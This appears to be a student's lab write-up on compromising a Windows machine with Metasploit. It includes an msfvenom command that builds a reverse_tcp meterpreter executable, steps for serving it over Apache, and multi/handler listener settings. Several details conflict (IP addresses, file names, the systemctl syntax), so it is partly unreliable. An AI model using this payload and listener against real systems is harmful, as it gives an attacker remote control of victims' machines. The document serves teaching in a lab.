# Compromising-windows-using-Metasploit
Compromising windows using Metasploit
# Metasploit
Compromising windows using Metasploit

# AIM:
# Name Abinav Aaditya
# Reg no :212224040008
To Compromise windows using Metasploit .

## DESIGN STEPS:

### Step 1:

Install kali linux either in partition or virtual box or in live mode

### Step 2:

Investigate on the various categories of tools as follows:

### Step 3:

Open terminal and try execute some kali linux commands

## EXECUTION STEPS AND ITS OUTPUT:

Find the attackers ip address using ifconfig
## OUTPUT:




Create a malicious executable file fun.exe using msfvenom command
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 -f exe > fun.exe
## OUTPUT:
<img width="463" height="56" alt="image" src="https://github.com/user-attachments/assets/433cdc8d-27ea-4324-8fe4-6cc921848ba8" />




copy the fun.exe into the apache /var/www/html folder
## OUTPUT:
<img width="530" height="70" alt="image" src="https://github.com/user-attachments/assets/e1d8ea5f-4bb9-4493-abcb-8bbccf7526bd" />



Start apache server
sudo systemctl apache2 start
## OUTPUT:
<img width="802" height="396" alt="image" src="https://github.com/user-attachments/assets/caaf7d67-6576-401c-964b-8dcab1fcbda4" />




Check the status of apache2
## OUTPUT:

<img width="633" height="63" alt="image" src="https://github.com/user-attachments/assets/25671970-c93f-455e-b33e-2efc7d46b227" />


Invoke msfconsole:
## OUTPUT:
<img width="819" height="816" alt="Screenshot 2026-02-06 182641" src="https://github.com/user-attachments/assets/3e5a2be8-34ed-4f12-b53e-b304411d6d75" />






Type help or a question mark "?" to see the list of all available commands you can use inside msfconsole.
## OUTPUT:
<img width="938" height="932" alt="Screenshot 2026-02-06 182743" src="https://github.com/user-attachments/assets/24ef4181-a9e0-4e05-aa5a-272b60dd2cd1" />




Starting a command and control Server
use multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 0.0.0.0

## OUTPUT:
<img width="530" height="70" alt="image" src="https://github.com/user-attachments/assets/99c262b6-90c2-484a-b54d-887cbdf74cfd" />



On the target Windows machine, open a Web browser and open this URL, replacing the IP address with the IP address of your Kali machine:
http://192.168.56.102/fun.exe  ( Replace IP address appropriately)
The file "paveen16.exe" downloads. 
## OUTPUT:

<img width="1050" height="561" alt="image" src="https://github.com/user-attachments/assets/364cd242-b8f9-46f5-af52-2320a94cedb5" />





On kali/parrot give the command exploit
## OUTPUT:

<img width="1046" height="557" alt="image" src="https://github.com/user-attachments/assets/59bbcea2-648f-4c48-8add-6322a4498269" />


## RESULT:
The Metasploit framework is  used to compromise windows and is examined successfully.


